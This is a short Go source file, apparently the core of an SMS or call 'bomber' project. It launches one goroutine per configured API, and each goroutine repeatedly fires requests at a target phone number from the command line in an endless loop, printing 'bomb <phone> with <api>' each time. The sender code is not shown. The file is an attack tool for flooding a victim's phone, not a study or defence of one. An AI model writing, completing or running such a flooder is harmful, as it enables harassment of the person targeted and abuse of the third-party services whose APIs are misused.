package core

import (
    "fmt"
    "time"
    "net/url"

    "bomb/cmd"
    "bomb/conf"
    "bomb/models"
)

func StartBomb(){
    for _, api := range conf.Datas {
        go bomb(api)
    }
}


func bomb(api models.API) {
    u, err := url.Parse(api.Url)
    if err != nil {
        fmt.Printf("bomb %s url is invalid, will not use this!\n", api.Url)
        return
    }
    sender := NewSender(u.Scheme)
    sender.Run()
    gap := api.Gap + cmd.Delay
    for {
        time.Sleep(time.Duration(gap)* time.Second)
        fmt.Printf("bomb %s with %s\n", cmd.Phone, api.Name)
        sender.Run()
    }
}


func send() {}
